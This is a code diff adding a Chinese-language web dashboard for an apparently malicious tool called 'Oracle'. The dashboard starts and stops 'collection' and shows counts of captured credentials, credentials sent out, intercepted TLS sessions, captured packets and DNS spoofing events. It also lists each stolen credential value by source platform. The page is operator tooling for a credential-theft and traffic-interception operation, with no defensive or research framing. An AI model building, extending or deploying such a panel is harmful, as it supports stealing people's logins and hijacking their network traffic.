@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>神谕 Oracle - 数据采集面板</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; background:#0d1117; color:#c9d1d9; padding:20px; }
+.header { display:flex; justify-content:space-between; align-items:center; margin-bottom:24px; }
+.header h1 { font-size:20px; font-weight:600; }
+.header h1 span { color:#58a6ff; }
+.status-badge { display:inline-block; padding:4px 12px; border-radius:12px; font-size:13px; font-weight:500; }
+.status-badge.running { background:#0e4429; color:#3fb950; }
+.status-badge.stopped { background:#3d1c1c; color:#f85149; }
+.cards { display:grid; grid-template-columns:repeat(auto-fit,minmax(140px,1fr)); gap:12px; margin-bottom:24px; }
+.card { background:#161b22; border:1px solid #30363d; border-radius:8px; padding:16px; }
+.card .label { font-size:12px; color:#8b949e; margin-bottom:4px; }
+.card .value { font-size:24px; font-weight:600; }
+.card .value.green { color:#3fb950; }
+.card .value.orange { color:#d29922; }
+.card .value.blue { color:#58a6ff; }
+.card .value.red { color:#f85149; }
+.controls { margin-bottom:24px; display:flex; gap:8px; }
+.controls button { padding:8px 20px; border:1px solid #30363d; border-radius:6px; font-size:14px; cursor:pointer; background:#21262d; color:#c9d1d9; }
+.controls button:hover { background:#30363d; }
+.controls button.primary { background:#238636; border-color:#238636; }
+.controls button.primary:hover { background:#2ea043; }
+.controls button.danger { background:#da3633; border-color:#da3633; }
+.controls button.danger:hover { background:#f85149; }
+table { width:100%; border-collapse:collapse; font-size:13px; }
+th { text-align:left; padding:8px 12px; border-bottom:2px solid #30363d; color:#8b949e; font-weight:500; }
+td { padding:8px 12px; border-bottom:1px solid #21262d; font-family:'SFMono-Regular',Consolas,monospace; font-size:12px; }
+tr:hover td { background:#161b22; }
+.url-cell { max-width:400px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+.empty { text-align:center; padding:40px; color:#8b949e; }
+.tabs { display:flex; gap:0; margin-bottom:16px; border-bottom:1px solid #30363d; }
+.tab { padding:8px 16px; cursor:pointer; border-bottom:2px solid transparent; color:#8b949e; font-size:13px; }
+.tab.active { border-bottom-color:#58a6ff; color:#c9d1d9; }
+.tab:hover { color:#c9d1d9; }
+.panel { display:none; }
+.panel.active { display:block; }
+.log-entry { font-family:'SFMono-Regular',Consolas,monospace; font-size:11px; padding:2px 0; color:#8b949e; }
+.log-entry.warn { color:#d29922; }
+.log-entry.error { color:#f85149; }
+.info-grid { display:grid; grid-template-columns:1fr 1fr; gap:12px; }
+.info-item { display:flex; justify-content:space-between; padding:8px 0; border-bottom:1px solid #21262d; font-size:13px; }
+.info-item .label { color:#8b949e; }
+</style>
+</head>
+<body>
+<div class="header">
+  <h1>⚡ <span>神谕</span> Oracle</h1>
+  <span id="statusBadge" class="status-badge stopped">⏳ 加载中...</span>
+</div>
+
+<div class="tabs">
+  <div class="tab active" onclick="switchTab('overview')">概览</div>
+  <div class="tab" onclick="switchTab('data')">采集数据</div>
+  <div class="tab" onclick="switchTab('config')">配置</div>
+</div>
+
+<div id="tab-overview" class="panel active">
+  <div class="cards" id="statsCards">
+    <div class="card"><div class="label">运行时间</div><div class="value blue" id="uptime">-</div></div>
+    <div class="card"><div class="label">已采集</div><div class="value green" id="credTotal">0</div></div>
+    <div class="card"><div class="label">今日新增</div><div class="value green" id="credToday">0</div></div>
+    <div class="card"><div class="label">已发送</div><div class="value orange" id="credSent">0</div></div>
+    <div class="card"><div class="label">活跃连接</div><div class="value" id="activeConns">0</div></div>
+    <div class="card"><div class="label">数据包捕获</div><div class="value" id="packetsCap">0</div></div>
+    <div class="card"><div class="label">DNS 劫持</div><div class="value" id="dnsSpoofed">0</div></div>
+    <div class="card"><div class="label">规则加载</div><div class="value" id="rulesLoaded">0</div></div>
+  </div>
+
+  <div class="controls">
+    <button id="btnStart" class="primary" onclick="doAction('start')">▶ 启动采集</button>
+    <button id="btnStop" class="danger" onclick="doAction('stop')">■ 停止采集</button>
+    <button onclick="refresh()">⟳ 刷新</button>
+  </div>
+
+  <h3 style="margin-bottom:12px;font-size:14px;color:#8b949e;">实时日志</h3>
+  <div id="logContainer" style="background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:12px;height:200px;overflow-y:auto;font-family:'SFMono-Regular',Consolas,monospace;font-size:11px;"></div>
+</div>
+
+<div id="tab-data" class="panel">
+  <h3 style="margin-bottom:12px;font-size:14px;color:#8b949e;">采集的凭证数据</h3>
+  <table>
+    <thead><tr><th style="width:140px">时间</th><th style="width:160px">来源</th><th style="width:80px">类型</th><th>值</th></tr></thead>
+    <tbody id="dataBody"></tbody>
+  </table>
+  <div class="empty" id="dataEmpty">暂无数据，启动采集后自动出现</div>
+</div>
+
+<div id="tab-config" class="panel">
+  <div class="info-grid" id="configGrid"></div>
+</div>
+
+<script>
+let state = { status:'stopped', uptime:0 };
+const LOG_MAX = 200;
+
+function log(msg, level='info') {
+  const el = document.getElementById('logContainer');
+  const d = new Date();
+  const t = d.toTimeString().slice(0,8);
+  const line = document.createElement('div');
+  line.className = 'log-entry ' + level;
+  line.textContent = `[${t}] ${msg}`;
+  el.appendChild(line);
+  if (el.children.length > LOG_MAX) el.removeChild(el.firstChild);
+  el.scrollTop = el.scrollHeight;
+}
+
+function switchTab(name) {
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+  document.querySelector(`.tab[onclick*='${name}']`).classList.add('active');
+  document.getElementById(`tab-${name}`).classList.add('active');
+}
+
+async function fetchJSON(url) {
+  const r = await fetch(url);
+  if (!r.ok) throw new Error(`HTTP ${r.status}`);
+  return r.json();
+}
+
+async function doAction(action) {
+  try {
+    const r = await fetch(`/${action}`, { method:'POST' });
+    const d = await r.json();
+    log(`操作 ${action}: ${d.status}`, d.status==='started'?'info':'warn');
+    await refresh();
+  } catch(e) {
+    log(`操作失败: ${e.message}`, 'error');
+  }
+}
+
+function fmtTime(sec) {
+  const h = Math.floor(sec/3600), m = Math.floor((sec%3600)/60), s = Math.floor(sec%60);
+  if (h>0) return `${h}h ${m}m ${s}s`;
+  if (m>0) return `${m}m ${s}s`;
+  return `${s}s`;
+}
+
+async function refresh() {
+  try {
+    const s = await fetchJSON('/status');
+    state = s;
+
+    document.getElementById('statusBadge').className = 'status-badge ' + (s.status==='running'?'running':'stopped');
+    document.getElementById('statusBadge').textContent = s.status==='running' ? 'Running' : 'Stopped';
+    document.getElementById('uptime').textContent = fmtTime(s.uptime_seconds||0);
+    document.getElementById('credTotal').textContent = s.credentials_queued||0;
+    document.getElementById('credToday').textContent = s.credentials_queued||0;
+    document.getElementById('credSent').textContent = (s.credentials_sent||0) + '/' + (s.credentials_failed||0);
+    document.getElementById('activeConns').textContent = Math.max(0, s.active_tls_sessions||0);
+    document.getElementById('packetsCap').textContent = s.packets_captured||0;
+    document.getElementById('dnsSpoofed').textContent = Math.max(0, s.dns_spoofed||0);
+    document.getElementById('rulesLoaded').textContent = '-';
+
+    document.getElementById('btnStart').style.display = s.status==='running'?'none':'inline-block';
+    document.getElementById('btnStop').style.display = s.status==='running'?'inline-block':'none';
+
+    // Config tab
+    try {
+      const cfg = await fetchJSON('/config');
+      const grid = document.getElementById('configGrid');
+      grid.innerHTML = '';
+      for (const [k,v] of Object.entries(cfg)) {
+        const val = Array.isArray(v) ? v.join(', ') : (typeof v==='object' ? JSON.stringify(v) : v);
+        grid.innerHTML += `<div class="info-item"><span class="label">${k}</span><span>${String(val).substring(0,120)}</span></div>`;
+      }
+    } catch(e) {}
+
+    // Data tab: fetch captured credentials
+    try {
+      const d = await fetchJSON('/data');
+      const tbody = document.getElementById('dataBody');
+      const empty = document.getElementById('dataEmpty');
+      tbody.innerHTML = '';
+
+      if (d.items && d.items.length > 0) {
+        empty.style.display = 'none';
+        d.items.slice().reverse().forEach(item => {
+          const time = item.captured_at ? new Date(item.captured_at).toLocaleTimeString() : '-';
+          const val = item.value || '';
+          const displayVal = val.length > 80 ? val.substring(0,77)+'...' : val;
+          tbody.innerHTML += `<tr>
+            <td>${time}</td>
+            <td>${item.platform || item.source || '-'}</td>
+            <td>${item.type || '-'}</td>
+            <td class="url-cell" title="${val}">${displayVal}</td>
+          </tr>`;
+        });
+        // Update stats with actual total
+        document.getElementById('credTotal').textContent = d.total || 0;
+      } else {
+        empty.style.display = 'block';
+      }
+    } catch(e) {}
+
+  } catch(e) {
+    log('Connection failed: ' + e.message, 'error');
+    document.getElementById('statusBadge').className = 'status-badge stopped';
+    document.getElementById('statusBadge').textContent = 'Offline';
+  }
+}
+
+// Auto refresh every 3 seconds
+refresh();
+log('面板已加载，自动刷新中...');
+setInterval(refresh, 3000);
+</script>
+</body>
+</html>
